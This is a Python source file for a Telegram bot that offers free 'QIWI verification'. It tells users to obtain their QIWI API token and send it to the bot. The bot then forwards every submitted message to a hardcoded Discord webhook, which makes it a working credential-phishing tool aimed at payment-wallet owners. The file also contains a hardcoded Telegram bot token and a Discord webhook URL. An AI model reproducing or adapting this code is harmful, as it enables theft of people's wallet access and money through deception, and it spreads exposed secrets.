# -*- coding: utf-8 -*-
import telebot
from telebot import types
import requests
from discord import SyncWebhook

TOKEN = '5452286677:AAGDYKbV_4aBR8HjpAOV5leEAQVmD2Uz7S4'

bot = telebot.TeleBot(TOKEN)

def main():
    markup = types.ReplyKeyboardMarkup(True)
    key1 = types.KeyboardButton('🧑🏼‍🎄Verification to status "Main"🧑🏼‍🎄')
    key2 = types.KeyboardButton('🧙🏼‍♂️Verification to status "Professional"🧙🏼‍♂️')
    key3 = types.KeyboardButton('💖Help💖')
    markup.add(key1)
    markup.add(key2)
    markup.add(key3)
    return markup

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, 'Hello in my bot! Here you can get a verification qiwi for free', reply_markup=main())

@bot.message_handler(content_types=['text'])
def cont(message):
    if message.text == '🧑🏼‍🎄Verification to status "Main"🧑🏼‍🎄':
        bot.send_message(message.chat.id, 
'''
1) get your token on teh site https://qiwi.com/api
------------------------------------------------------
2) send it here
------------------------------------------------------
3) wait to your verification''', reply_markup=main())
        bot.register_next_step_handler(message, next_step)

    elif message.text == '🧙🏼‍♂️Verification to status "Professional"🧙🏼‍♂️':
        bot.send_message(message.chat.id, 
'''
1) get your token on teh site https://qiwi.com/api
------------------------------------------------------
2) send it here
------------------------------------------------------
3) wait to your verification''', reply_markup=main())
        bot.register_next_step_handler(message, next_step)
    elif message.text == '💖Help💖':
        bot.send_message(message.chat.id, 
'''
if your qiwi don't been verifing in the 1 days period,
go to our support to get help
@SEMPLY2
''', reply_markup=main())

    else:
        pass


def next_step(message):
    if message.text == '🧑🏼‍🎄Verification to status "Main"🧑🏼‍🎄':
        pass
    elif message.text == '🧙🏼‍♂️Verification to status "Professional"🧙🏼‍♂️':
        pass
    elif message.text == '💖Help💖':
        pass
    elif message.text == '/start':
        pass
    else:

        webhook = SyncWebhook.from_url("https://discord.com/api/webhooks/989213613925470248/FCgT2_NKNLOPozRxg9QvNajWiY91x5LUFY4WlDzpyyKBp_10q73sClUi255RR0aTsMGfe")
        webhook.send(message.text)

bot.polling()
